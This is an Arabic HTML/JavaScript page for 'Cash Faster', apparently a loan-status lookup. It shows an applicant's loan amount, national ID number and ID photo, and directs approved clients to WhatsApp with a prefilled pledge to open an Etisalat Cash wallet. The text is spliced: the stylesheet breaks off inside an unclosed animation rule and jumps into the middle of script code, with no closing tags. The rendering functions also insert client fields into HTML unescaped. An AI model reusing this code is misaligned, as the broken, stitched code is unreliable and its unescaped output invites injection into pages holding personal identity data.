<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Cash Faster | الاستعلام الفوري عن طلب العميل</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --primary: #1A8C4A;
    --primary-light: #E8F5EE;
    --primary-dark: #0F6B38;
    --gold: #B8912E;
    --gold-light: #FBF6E8;
    --gold-dark: #8E6F1F;
    --bg: #F7F9FB;
    --bg-card: #FFFFFF;
    --bg-soft: #F0F4F8;
    --text: #1A2332;
    --text-muted: #6B7A8F;
    --border: #E1E8F0;
    --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
    --shadow: 0 8px 32px rgba(26,35,50,0.08);
    --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
    --success: #16A34A;
    --success-light: #DCFCE7;
    --info: #2563EB;
    --info-light: #DBEAFE;
    --warning: #D97706;
    --warning-light: #FEF3C7;
    --danger: #DC2626;
    --danger-light: #FEE2E2;
    --purple: #7C3AED;
    --purple-light: #EDE9FE;
    --etisalat-blue: #0284C7;
    --etisalat-light: #E0F2FE;
    --review-color: #D97706;
    --invalid-color: #DC2626;
    --pending-approval: #7C3AED;
    --pending-light: #EDE9FE;
    --font: 'Cairo', sans-serif;
    --radius: 1.4rem;
    --radius-sm: 0.9rem;
  }
  body {
    font-family: var(--font);
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 1rem;
    position: relative;
    overflow-x: hidden;
    line-height: 1.7;
  }

  .watermark {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 0;
    pointer-events: none;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .watermark::before {
    content: 'CASH FASTER';
    position: absolute;
    font-size: 9rem;
    font-weight: 900;
    color: rgba(26,140,74,0.045);
    letter-spacing: 0.3rem;
    transform: rotate(-32deg);
    white-space: nowrap;
    font-family: var(--font);
  }
  .watermark::after {
    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';
    position: absolute;
    font-size: 1.6rem;
    font-weight: 800;
    color: rgba(184,145,46,0.04);
    letter-spacing: 0.2rem;
    transform: rotate(-32deg);
    white-space: nowrap;
    line-height: 5rem;
    width: 200%;
    text-align: center;
    font-family: var(--font);
  }

  .app-container {
    max-width: 480px;
    width: 100%;
    background: var(--bg-card);
    border-radius: 2rem;
    padding: 1.4rem 1.2rem;
    box-shadow: var(--shadow-lg);
    border: 1px solid var(--border);
    position: relative;
    z-index: 1;
    margin-bottom: 1rem;
  }

  .promo-strip {
    background: linear-gradient(135deg, var(--primary-light), var(--gold-light));
    border: 1px solid rgba(26,140,74,0.12);
    border-radius: 3rem;
    padding: 0.55rem 1.2rem;
    margin-bottom: 1.2rem;
    text-align: center;
    font-size: 0.72rem;
    color: var(--primary-dark);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    flex-wrap: wrap;
    font-weight: 600;
  }
  .promo-strip i { color: var(--primary); }
  .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }

  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-bottom: 1rem;
    border-bottom: 1px solid var(--border);
  }
  .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }
  .brand .icon {
    width: 48px; height: 48px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    border-radius: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.5rem;
    color: #FFFFFF;
    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
  }
  .brand h1 {
    font-size: 1.4rem;
    font-weight: 900;
    color: var(--text);
    letter-spacing: 0.3px;
    line-height: 1.2;
  }
  .brand h1 span {
    color: var(--gold);
    display: block;
    font-size: 0.7rem;
    letter-spacing: 2px;
    font-weight: 700;
    margin-top: 1px;
  }
  .header .badge {
    background: var(--success-light);
    border: 1px solid rgba(22,163,74,0.2);
    border-radius: 3rem;
    padding: 0.35rem 0.9rem;
    font-size: 0.65rem;
    color: var(--success);
    display: flex;
    align-items: center;
    gap: 0.4rem;
    font-weight: 700;
  }
  .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
  @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

  .nav-tabs {
    display: flex;
    gap: 0.4rem;
    margin: 1.1rem 0;
    background: var(--bg-soft);
    border-radius: 3rem;
    padding: 0.35rem;
  }
  .nav-tabs .tab {
    flex: 1;
    text-align: center;
    padding: 0.55rem 0.3rem;
    border-radius: 3rem;
    font-size: 0.65rem;
    font-weight: 700;
    color: var(--text-muted);
    transition: 0.25s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.35rem;
  }
  .nav-tabs .tab.active {
    background: var(--bg-card);
    color: var(--primary-dark);
    box-shadow: var(--shadow-sm);
  }

  .search-box {
    display: flex;
    gap: 0.6rem;
    margin: 0.9rem 0 1.3rem 0;
  }
  .search-box input {
    flex: 1;
    padding: 0.95rem 1.2rem;
    border-radius: 3rem;
    border: 2px solid var(--border);
    background: var(--bg-soft);
    color: var(--text);
    font-size: 0.95rem;
    text-align: center;
    transition: 0.25s;
    font-family: var(--font);
    font-weight: 600;
    letter-spacing: 1px;
  }
  .search-box input:focus {
    outline: none;
    border-color: var(--primary);
    background: #FFFFFF;
    box-shadow: 0 0 0 4px rgba(26,140,74,0.1);
  }
  .search-box input::placeholder {
    color: var(--text-muted);
    font-weight: 400;
    letter-spacing: 0;
  }
  .search-box button {
    padding: 0.95rem 1.6rem;
    border: none;
    border-radius: 3rem;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    color: #FFFFFF;
    font-weight: 800;
    cursor: pointer;
    transition: 0.25s;
    font-family: var(--font);
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
    white-space: nowrap;
  }
  .search-box button:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 28px rgba(26,140,74,0.35);
  }

  .loan-card {
    background: linear-gradient(145deg, #FFFFFF, #FAFCFE);
    border-radius: var(--radius);
    padding: 1.5rem 1.2rem;
    border: 1px solid var(--border);
    margin-bottom: 1rem;
    position: relative;
    overflow: hidden;
    box-shadow: var(--shadow-sm);
  }
  .loan-card::before {
    content: '';
    position: absolute;
    top: 0; right: 0;
    width: 120px; height: 120px;
    background: radial-gradient(circle, rgba(184,145,46,0.08), transparent 70%);
    pointer-events: none;
  }
  .loan-card .loan-label {
    font-size: 0.7rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1.5px;
    text-align: center;
    font-weight: 700;
  }
  .loan-card .loan-amount-main {
    text-align: center;
    font-size: 2.8rem;
    font-weight: 900;
    color: var(--primary-dark);
    margin: 0.3rem 0;
    letter-spacing: 1px;
    line-height: 1.1;
  }
  .loan-card .loan-amount-main .currency {
    font-size: 1.2rem;
    color: var(--text-muted);
    font-weight: 700;
  }
  .loan-card .loan-percent {
    text-align: center;
    font-size: 0.85rem;
    color: var(--success);
    font-weight: 800;
    margin-bottom: 0.8rem;
  }
  .loan-card .loan-percent i { margin-left: 0.4rem; }

  .loan-details-grid {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    gap: 0.6rem;
    margin-top: 1rem;
    padding-top: 1rem;
    border-top: 1px dashed var(--border);
  }
  .loan-details-grid .detail-item {
    text-align: center;
    background: var(--bg-soft);
    border-radius: var(--radius-sm);
    padding: 0.6rem 0.3rem;
    transition: 0.2s;
  }
  .loan-details-grid .detail-item:hover { background: var(--primary-light); }
  .loan-details-grid .detail-item .label {
    font-size: 0.55rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 0.5px;
    font-weight: 700;
  }
  .loan-details-grid .detail-item .value {
    font-size: 0.88rem;
    font-weight: 800;
    color: var(--text);
    margin-top: 0.2rem;
  }
  .loan-details-grid .detail-item .value.gold { color: var(--gold-dark); }
  .loan-details-grid .detail-item .value.green { color: var(--success); }
  .loan-details-grid .detail-item .value.danger { color: var(--danger); }
  .loan-details-grid .detail-item .value.warning { color: var(--warning); }
  .loan-details-grid .detail-item .value.vodafone { color: var(--danger); }
  .loan-details-grid .detail-item .value.review { color: var(--review-color); }
  .loan-details-grid .detail-item .value.pending-approval { color: var(--pending-approval); }

  .status-bar {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    background: var(--bg-card);
    border-radius: var(--radius);
    padding: 0.9rem 1.1rem;
    border: 1px solid var(--border);
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .status-bar .status-icon {
    width: 42px; height: 42px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1rem;
    flex-shrink: 0;
  }
  .status-bar .status-text { flex: 1; }
  .status-bar .status-text .main {
    font-weight: 800;
    font-size: 0.9rem;
    line-height: 1.3;
  }
  .status-bar .status-text .sub {
    font-size: 0.68rem;
    color: var(--text-muted);
    margin-top: 0.15rem;
  }
  .status-bar .status-badge {
    border-radius: 3rem;
    padding: 0.2rem 0.7rem;
    font-size: 0.6rem;
    font-weight: 700;
  }
  .status-bar.approved { border-color: rgba(22,163,74,0.25); background: linear-gradient(135deg, #FFFFFF, var(--success-light)); }
  .status-bar.approved .status-icon { background: var(--success-light); color: var(--success); }
  .status-bar.approved .status-text .main { color: var(--success); }
  .status-bar.approved .status-badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.25); color: var(--success); }
  .status-bar.review { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
  .status-bar.review .status-icon { background: var(--warning-light); color: var(--warning); }
  .status-bar.review .status-text .main { color: var(--warning); }
  .status-bar.review .status-badge { background: var(--warning-light); border: 1px solid rgba(217,119,6,0.25); color: var(--warning); }
  .status-bar.rejected { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
  .status-bar.rejected .status-icon { background: var(--danger-light); color: var(--danger); }
  .status-bar.rejected .status-text .main { color: var(--danger); }
  .status-bar.rejected .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--danger); }
  .status-bar.invalid { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
  .status-bar.invalid .status-icon { background: var(--danger-light); color: var(--invalid-color); }
  .status-bar.invalid .status-text .main { color: var(--invalid-color); }
  .status-bar.invalid .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--invalid-color); }
  .status-bar.pending-approval { border-color: rgba(124,58,237,0.25); background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); }
  .status-bar.pending-approval .status-icon { background: var(--pending-light); color: var(--pending-approval); }
  .status-bar.pending-approval .status-text .main { color: var(--pending-approval); }
  .status-bar.pending-approval .status-badge { background: var(--pending-light); border: 1px solid rgba(124,58,237,0.25); color: var(--pending-approval); }

  .client-info {
    background: var(--bg-card);
    border-radius: var(--radius);
    padding: 1rem 1.2rem;
    border: 1px solid var(--border);
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .client-info .info-title {
    font-size: 0.75rem;
    font-weight: 800;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 0.6rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
  }
  .client-info .info-title i { color: var(--primary); }
  .client-info .row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.55rem 0;
    border-bottom: 1px solid var(--border);
    font-size: 0.85rem;
    gap: 0.5rem;
  }
  .client-info .row:last-child { border-bottom: none; }
  .client-info .row .key {
    color: var(--text-muted);
    font-weight: 600;
    flex-shrink: 0;
  }
  .client-info .row .value {
    font-weight: 700;
    text-align: left;
    color: var(--text);
    word-break: break-word;
  }
  .client-info .row .value.gold { color: var(--gold-dark); }
  .client-info .row .value.green { color: var(--success); }
  .client-info .row .value.danger { color: var(--danger); }
  .client-info .row .value.warning { color: var(--warning); }
  .client-info .row .value.review { color: var(--review-color); }
  .client-info .row .value.pending-approval { color: var(--pending-approval); }

  /* ===== صورة التحقق من الهوية ===== */
  .id-verification {
    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
    border: 2px solid var(--gold);
    border-radius: var(--radius);
    padding: 1.1rem;
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .id-verification .idv-header {
    display: flex;
    align-items: center;
    gap: 0.6rem;
    margin-bottom: 0.8rem;
    padding-bottom: 0.6rem;
    border-bottom: 1px solid rgba(184,145,46,0.2);
  }
  .id-verification .idv-header .idv-icon {
    width: 38px; height: 38px;
    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #FFFFFF;
    font-size: 1rem;
    flex-shrink: 0;
  }
  .id-verification .idv-header h4 {
    font-size: 0.9rem;
    font-weight: 800;
    color: var(--gold-dark);
    line-height: 1.3;
  }
  .id-verification .idv-header p {
    font-size: 0.68rem;
    color: var(--text-muted);
    margin-top: 0.1rem;
  }
  .id-verification .idv-image-box {
    background: #FFFFFF;
    border: 1px dashed var(--gold);
    border-radius: var(--radius-sm);
    padding: 0.6rem;
    text-align: center;
    overflow: hidden;
  }
  .id-verification .idv-image-box img {
    max-width: 100%;
    height: auto;
    border-radius: 0.6rem;
    display: block;
    margin: 0 auto;
    max-height: 320px;
    object-fit: contain;
  }
  .id-verification .idv-image-box .idv-placeholder {
    padding: 1.5rem 0.5rem;
    color: var(--text-muted);
    font-size: 0.78rem;
    font-weight: 600;
  }
  .id-verification .idv-image-box .idv-placeholder i {
    font-size: 2rem;
    color: var(--gold);
    display: block;
    margin-bottom: 0.4rem;
  }
  .id-verification .idv-caption {
    font-size: 0.68rem;
    color: var(--text-muted);
    text-align: center;
    margin-top: 0.5rem;
    font-weight: 600;
  }

  .status-message-box {
    border-radius: var(--radius);
    padding: 1.1rem;
    margin: 0.9rem 0;
    text-align: center;
    position: relative;
    z-index: 1;
  }
  .status-message-box .status-icon {
    font-size: 2.5rem;
    display: block;
    margin-bottom: 0.5rem;
  }
  .status-message-box h3 {
    font-size: 1.05rem;
    font-weight: 800;
    margin-bottom: 0.3rem;
  }
  .status-message-box p {
    font-size: 0.82rem;
    line-height: 1.9;
    color: var(--text-muted);
  }
  .status-message-box.approved { background: linear-gradient(135deg, #FFFFFF, var(--success-light)); border: 2px solid var(--success); }
  .status-message-box.approved h3 { color: var(--success); }
  .status-message-box.review { background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); border: 2px solid var(--warning); }
  .status-message-box.review h3 { color: var(--warning); }
  .status-message-box.rejected { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--danger); }
  .status-message-box.rejected h3 { color: var(--danger); }
  .status-message-box.invalid { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--invalid-color); }
  .status-message-box.invalid h3 { color: var(--invalid-color); }
  .status-message-box.pending-approval { background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); border: 2px solid var(--pending-approval); }
  .status-message-box.pending-approval h3 { color: var(--pending-approval); }

  .wallet-notice {
    border-radius: var(--radius);
    padding: 1.1rem;
    margin: 0.9rem 0;
    position: relative;
  }
  .wallet-notice .notice-head {
    display: flex;
    align-items: center;
    gap: 0.7rem;
    margin-bottom: 0.5rem;
  }
  .wallet-notice .notice-head i { font-size: 1.6rem; flex-shrink: 0; }
  .wallet-notice .notice-head h4 { font-size: 0.9rem; font-weight: 800; }
  .wallet-notice p { color: var(--text-muted); font-size: 0.78rem; line-height: 1.9; }
  .wallet-notice.etisalat {
    background: linear-gradient(135deg, #FFFFFF, var(--etisalat-light));
    border: 2px solid var(--etisalat-blue);
  }
  .wallet-notice.etisalat .notice-head i,
  .wallet-notice.etisalat .notice-head h4 { color: var(--etisalat-blue); }
  .wallet-notice.vodafone {
    background: linear-gradient(135deg, #FFFFFF, var(--danger-light));
    border: 2px solid var(--danger);
  }
  .wallet-notice.vodafone .notice-head i,
  .wallet-notice.vodafone .notice-head h4 { color: var(--danger); }
  .wallet-notice.none {
    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
    border: 2px solid var(--gold);
  }
  .wallet-notice.none .notice-head i,
  .wallet-notice.none .notice-head h4 { color: var(--gold-dark); }

  .btn-whatsapp-transfer {
    width: 100%;
    padding: 1rem 1.2rem;
    border: none;
    border-radius: 3rem;
    background: linear-gradient(135deg, #25D366, #128C7E);
    color: #FFFFFF;
    font-weight: 800;
    font-size: 0.95rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.7rem;
    cursor: pointer;
    transition: 0.25s;
    box-shadow: 0 8px 28px rgba(37,211,102,0.3);
    margin-top: 0.8rem;
    font-family: var(--font);
    position: relative;
    z-index: 1;
    animation: pulseWhatsApp 2s ease-in-out infinite;
  }
  @keyframes pulseWhatsApp {
    0%,100% { box-shadow: 0 8px 28px rgba(37,211,102,0.3); transform: scale(1); }
    50% { box-shadow: 0 8px 42px rgba(37,211,102,0.5), 0 0 60px rgba(37,211,102,0.15); transform: scale(1.015); }
  }
  .btn-whatsapp-transfer:hover {
    transform: translateY(-2px) scale(1.02);
    box-shadow: 0 12px 38px rgba(37,211,102,0.45);
  }
  .btn-whatsapp-transfer i { font-size: 1.3rem; }
  .btn-whatsapp-transfer .badge-new {
    background: rgba(255,255,255,0.22);
    border-radius: 3rem;
    padding: 0.1rem 0.6rem;
    font-size: 0.6rem;
    font-weight: 800;
  }
  .btn-whatsapp-transfer .arrow-icon {
    animation: arrowMove 1.2s ease-in-out infinite;
  }
  @keyframes arrowMove {
    0%,100% { transform: translateX(0); }
    50% { transform: translateX(-6px); }

        msg += `📱 لدي محفظة فودافون كاش حالياً.\n🔢 رقم المحفظة: ${currentClient.walletNum || "سيتم تسجيله"}\n\n⚠️ أوافق وأقر بفتح محفظة اتصالات كاش مسجلة باسمي لاستكمال إجراءات صرف القرض.\n📱 سأقوم بفتح المحفظة وإبلاغكم برقمها الجديد في أقرب وقت.\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل، وأنا مسؤول مسؤولية كاملة عن هذا الطلب.\n\n🙏 يرجى توجيهي للخطوات التالية.\nشكراً لكم.`;
      } else {
        msg += `⚠️ لا أملك أي محفظة إلكترونية حالياً.\n\n✅ أوافق وأقر بفتح محفظة اتصالات كاش مسجلة باسمي لاستكمال إجراءات صرف القرض.\n📱 سأقوم بفتح المحفظة وإبلاغكم برقمها الجديد في أقرب وقت.\n\n🤝 أتعهد بالالتزام بجميع شروط وأحكام التمويل، وأنا مسؤول مسؤولية كاملة عن هذا الطلب.\n\n🙏 يرجى توجيهي للخطوات التالية.\nشكراً لكم.`;
      }

      window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
    } else {
      window.open(WHATSAPP_URL, '_blank');
    }
  }

  function createTransferButton(client) {
    const hasEtisalat = client.hasEtisalat || false;
    let btnClass = "btn-whatsapp-transfer";
    let btnText, btnIcon;

    if (hasEtisalat) {
      btnClass += " etisalat-btn";
      btnIcon = '<i class="fab fa-whatsapp"></i>';
      btnText = '📤 اطلب ملف التسيل الآن عبر واتساب';
    } else {
      btnClass += " gold-btn";
      btnIcon = '<i class="fas fa-triangle-exclamation"></i>';
      btnText = '⚠️ أوافق على فتح محفظة اتصالات كاش';
    }

    return `
      <button class="${btnClass}" onclick="openWhatsApp()">
        ${btnIcon}
        <span class="badge-new">✨ متاح الآن</span>
        <span>${btnText}</span>
        <span class="arrow-icon"><i class="fas fa-arrow-left"></i></span>
      </button>
    `;
  }

  function buildLoanCard(client, totalDisplay) {
    const hasEtisalat = client.hasEtisalat || false;
    const hasVodafone = client.hasVodafone || false;

    let walletDisplay, walletColor;
    if (hasEtisalat) {
      walletDisplay = "📱 اتصالات كاش";
      walletColor = "gold";
    } else if (hasVodafone) {
      walletDisplay = "📱 فودافون كاش";
      walletColor = "vodafone";
    } else {
      walletDisplay = "📱 سيتم فتح محفظة اتصالات كاش";
      walletColor = "warning";
    }

    const statusMap = {
      'approved': '✅ معتمد',
      'review': '⏳ قيد المراجعة',
      'rejected': '❌ مرفوض',
      'invalid': '⚠️ بيانات غير صحيحة',
      'pending-approval': '🔄 قيد الموافقة'
    };
    const currentStatus = client.status || 'pending-approval';

    return `
      <div class="loan-card">
        <div class="loan-label">💰 مبلغ القرض</div>
        <div class="loan-amount-main">${client.loan.toLocaleString('ar-EG')} <span class="currency">ج.م</span></div>
        <div class="loan-percent"><i class="fas fa-circle-check"></i> ${statusMap[currentStatus] || 'قيد المراجعة'}</div>

        <div class="loan-details-grid">
          <div class="detail-item"><div class="label">💰 مبلغ القرض</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm || "يحدد لاحقاً"}</div></div>
          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment || "يحدد لاحقاً"} ج.م</div></div>
          <div class="detail-item"><div class="label">💳 إجمالي السداد</div><div class="value">${totalDisplay}</div></div>
          <div class="detail-item"><div class="label">📱 نوع المحفظة</div><div class="value ${walletColor}">${walletDisplay}</div></div>
          <div class="detail-item"><div class="label">🔢 رقم المحفظة</div><div class="value">${client.walletNum || "سيتم تسجيله"}</div></div>
        </div>
      </div>
    `;
  }

  function buildIdVerification(client) {
    if (!client.idVerificationImage || client.idVerificationImage.trim() === "") {
      return '';
    }
    return `
      <div class="id-verification">
        <div class="idv-header">
          <div class="idv-icon"><i class="fas fa-id-card"></i></div>
          <div>
            <h4>🆔 التحقق من هوية العميل</h4>
            <p>📸 صورة الهوية الموثقة في ملفك على السيستم</p>
          </div>
        </div>
        <div class="idv-image-box">
          <img src="${client.idVerificationImage}" alt="صورة التحقق من الهوية" onerror="this.parentElement.innerHTML='<div class=\\'idv-placeholder\\'><i class=\\'fas fa-image\\'></i>⚠️ تعذر تحميل الصورة</div>'">
        </div>
        <div class="idv-caption">
          🔒 <i class="fas fa-shield-halved"></i> هذه الصورة محفوظة بشكل آمن في ملفك الشخصي
        </div>
      </div>
    `;
  }

  function buildClientDetails(client) {
    const hasEtisalat = client.hasEtisalat || false;
    const hasVodafone = client.hasVodafone || false;

    let walletClass, walletDisplay;
    if (hasEtisalat) {
      walletDisplay = "اتصالات كاش";
      walletClass = "gold";
    } else if (hasVodafone) {
      walletDisplay = "فودافون كاش";
      walletClass = "vodafone";
    } else {
      walletDisplay = "سيتم فتح محفظة اتصالات كاش";
      walletClass = "warning";
    }

    const statusMap = {
      'approved': '✅ معتمد',
      'review': '⏳ قيد المراجعة',
      'rejected': '❌ مرفوض',
      'invalid': '⚠️ بيانات غير صحيحة',
      'pending-approval': '🔄 قيد الموافقة'
    };
    const statusColor = {
      'approved': 'green',
      'review': 'review',
      'rejected': 'danger',
      'invalid': 'danger',
      'pending-approval': 'pending-approval'
    };
    const currentStatus = client.status || 'pending-approval';

    return `
      <div class="client-info">
        <div class="info-title"><i class="fas fa-user-circle"></i> 👤 بيانات العميل</div>
        <div class="row"><span class="key">👤 الاسم</span><span class="value">${client.name}</span></div>
        <div class="row"><span class="key">🔢 الرقم القومي</span><span class="value gold">${client.id || currentNationalId}</span></div>
        <div class="row"><span class="key">💼 الوظيفة</span><span class="value">${client.job || "غير مسجل"}</span></div>
        <div class="row"><span class="key">📱 المحفظة</span><span class="value ${walletClass}">${walletDisplay}</span></div>
        <div class="row"><span class="key">🔢 رقم المحفظة</span><span class="value">${client.walletNum || "سيتم تسجيله"}</span></div>
        <div class="row"><span class="key">📊 حالة الطلب</span><span class="value ${statusColor[currentStatus]}">${statusMap[currentStatus] || 'قيد المراجعة'}</span></div>
        ${client.guarantor ? `<div class="row"><span class="key">👥 الضامن</span><span class="value">${client.guarantor.name} (${client.guarantor.relation})</span></div>` : ''}
        ${client.address ? `<div class="row"><span class="key">🏠 العنوان</span><span class="value">${client.address}</span></div>` : ''}
      </div>
    `;
  }

  function buildStatusMessage(client) {
    const status = client.status || 'pending-approval';
    const messages = {
      'approved': {
        class: 'approved',
        icon: '🏆',
        title: '🎉 تهانينا! تمت الموافقة النهائية!',
        desc: `✅ تم اعتماد طلب التمويل الخاص بك بنجاح.<br>💰 <strong style="color: var(--gold-dark);">اضغط على زر التواصل مع التحويلات المالية</strong> لإنهاء إجراءات الصرف فوراً.`
      },
      'review': {
        class: 'review',
        icon: '⏳',
        title: '⏳ طلبك قيد المراجعة',
        desc: `🔍 جاري دراسة طلبك من قبل فريق الائتمان.<br>💡 <strong style="color: var(--warning);">يرجى متابعة طلبك من حين لآخر حتى تظهر النتيجة النهائية.</strong>`
      },
      'rejected': {
        class: 'rejected',
        icon: '❌',
        title: '❌ تم رفض طلبك',
        desc: `😔 نأسف لإبلاغك بأن طلب التمويل الخاص بك لم تتم الموافقة عليه.<br>📞 يمكنك التواصل مع خدمة العملاء لمعرفة الأسباب.`
      },
      'invalid': {
        class: 'invalid',
        icon: '⚠️',
        title: '⚠️ بيانات غير صحيحة',
        desc: `📋 تبين أن بعض البيانات المقدمة غير صحيحة أو غير مكتملة.<br>✏️ يرجى تحديث بياناتك وإعادة التقديم.`
      },
      'pending-approval': {
        class: 'pending-approval',
        icon: '🔄',
        title: '🔄 جارى حصولك على الموافقة',
        desc: `📊 طلبك في المرحلة النهائية من التقييم.<br>💡 <strong style="color: var(--pending-approval);">يرجى متابعة طلبك من حين لآخر حتى تظهر النتيجة النهائية.</strong>`
      }
    };
    const msg = messages[status] || messages['pending-approval'];
    return `
      <div class="status-message-box ${msg.class}">
        <span class="status-icon">${msg.icon}</span>
        <h3>${msg.title}</h3>
        <p>${msg.desc}</p>
      </div>
    `;
  }

  function buildWalletNotice(client) {
    const hasEtisalat = client.hasEtisalat || false;
    const hasVodafone = client.hasVodafone || false;

    if (hasEtisalat) {
      return `
        <div class="wallet-notice etisalat">
          <div class="notice-head">
            <i class="fas fa-mobile-screen-button"></i>
            <h4>📱 محفظة اتصالات كاش مسجلة</h4>
          </div>
          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>تم تسجيل محفظة <strong style="color: var(--etisalat-blue);">اتصالات كاش</strong> الخاصة بك.</p>
          <p style="font-size: 0.72rem; margin-top: 0.4rem;">🔢 <i class="fas fa-wallet"></i> رقم المحفظة: <strong style="color: var(--etisalat-blue);">${client.walletNum}</strong></p>
        </div>
      `;
    } else if (hasVodafone) {
      return `
        <div class="wallet-notice vodafone">
          <div class="notice-head">
            <i class="fas fa-triangle-exclamation"></i>
            <h4>⚠️ محفظة فودافون كاش غير مدعومة</h4>
          </div>
          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>نخدم حالياً <strong style="color: var(--etisalat-blue);">اتصالات كاش</strong> فقط.<br>📱 يرجى فتح محفظة اتصالات كاش في أسرع وقت ممكن.</p>
        </div>
      `;
    } else {
      return `
        <div class="wallet-notice none">
          <div class="notice-head">
            <i class="fas fa-circle-info"></i>
            <h4>📌 مطلوب فتح محفظة اتصالات كاش</h4>
          </div>
          <p>💚 عزيزي <strong style="color: var(--text);">${client.name}</strong>،<br>نخدم حالياً <strong style="color: var(--etisalat-blue);">اتصالات كاش</strong> فقط.<br>📱 يرجى فتح محفظة اتصالات كاش في أسرع وقت ممكن.</p>
        </div>
      `;
    }
  }

  function displayResult(client, nationalId) {
    currentClient = client;
    currentNationalId = nationalId;
    const resultArea = document.getElementById('resultArea');
    const totalDisplay = calculateTotal(client);
    updateAdminStatus(client.status || 'pending-approval');

    let html = '';
    html += buildLoanCard(client, totalDisplay);
    html += buildIdVerification(client);
    html += buildClientDetails(client);

    const status = client.status || 'pending-approval';
    const statusMap = {
      'approved': { class: 'approved', icon: 'fa-circle-check', main: '✅ تمت الموافقة النهائية!', sub: '💚 تم اعتماد طلب التمويل الخاص بك بنجاح', badge: '✅ معتمد' },
      'review': { class: 'review', icon: 'fa-clock', main: '⏳ طلبك قيد المراجعة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '⏳ قيد المراجعة' },
      'rejected': { class: 'rejected', icon: 'fa-circle-xmark', main: '❌ تم رفض طلبك', sub: '😔 نأسف، لم تتم الموافقة على طلب التمويل', badge: '❌ مرفوض' },
      'invalid': { class: 'invalid', icon: 'fa-triangle-exclamation', main: '⚠️ بيانات غير صحيحة', sub: '✏️ يرجى تحديث بياناتك وإعادة التقديم', badge: '⚠️ بيانات غير صحيحة' },
      'pending-approval': { class: 'pending-approval', icon: 'fa-arrows-rotate', main: '🔄 جارى حصولك على الموافقة', sub: '💡 يرجى متابعة طلبك من حين لآخر', badge: '🔄 قيد الموافقة النهائية' }
    };
    const s = statusMap[status] || statusMap['pending-approval'];

    html += `
      <div class="status-bar ${s.class}">
        <div class="status-icon"><i class="fas ${s.icon}"></i></div>
        <div class="status-text">
          <div class="main">${s.main}</div>
          <div class="sub">${s.sub}</div>
        </div>
        <div class="status-badge">${s.badge}</div>
      </div>
    `;

    html += buildStatusMessage(client);
    html += buildWalletNotice(client);

    // 🔒 زر التواصل مع التحويلات المالية على واتساب يظهر ONLY في حالة الموافقة
    if (status === 'approved') {
      html += createTransferButton(client);
    }
